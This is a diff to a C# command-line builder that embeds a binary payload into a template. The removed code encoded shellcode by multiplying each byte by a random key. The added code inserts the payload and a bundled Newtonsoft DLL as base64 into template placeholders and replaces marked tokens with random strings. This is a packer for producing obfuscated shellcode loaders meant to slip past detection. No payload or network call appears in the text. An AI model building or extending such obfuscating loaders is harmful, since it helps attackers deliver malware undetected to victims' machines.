@@ -33,18 +33,6 @@ namespace ConsoleApp
                 result.Add(m.Value);
             return result;
         }
-
-        public static string ConvertShellcodeToIntVariable(byte[]? shellcode, int key_to_divide)
-        {
-            if (shellcode == null) return "";
-            int[] output = new int[shellcode.Length];
-            for (int i = 0; i < shellcode.Length; i++)
-            {
-                output[i] = shellcode[i] * key_to_divide;
-            }
-            string result = string.Join(",", output);
-            return result;
-        }
     }
 
 
@@ -52,28 +40,28 @@ namespace ConsoleApp
     {
         static  async Task Main(string[] args)
         {
-            if (args.Length < 3)
+            if (args.Length < 4)
             {
-                Console.WriteLine("Usage: ConsoleApp.exe <template> <binary> <output>");
+                Console.WriteLine("Usage: ConsoleApp.exe <template> <binary> <newton> <output>");
                 return;
             }
 
             var template = await File.ReadAllTextAsync(args[0]);
             var dll = await File.ReadAllBytesAsync(args[1]);
+            var newton = await File.ReadAllBytesAsync(args[2]);
 
-            var randomKey = GenerateCode._rand.Next(100, 200);
-            template = template.Replace("__KEY_PLACEHOLDER__", randomKey.ToString());
-            var shellcode = GenerateCode.ConvertShellcodeToIntVariable(dll, randomKey);
-            template = template.Replace("__SHELLCODE_PLACEHOLDER__", shellcode);
+            template = template.Replace("__PAYLOAD_B64__", Convert.ToBase64String(dll));
+            template = template.Replace("__DLL_NEWTONSOFT_B64__", Convert.ToBase64String(newton));
 
             var tokens = GenerateCode.FindTokens(template);
-            HashSet<string> generated = new();
+            if (tokens == null) Environment.Exit(1);
+            HashSet<string> generated = [];
             foreach (var t in tokens)
             {
                 template = template.Replace(t, GenerateCode.GenerateRandomString(generated));
             }
 
-            await File.WriteAllTextAsync(args[2], template);
+            await File.WriteAllTextAsync(args[3], template);
 
         }
     }
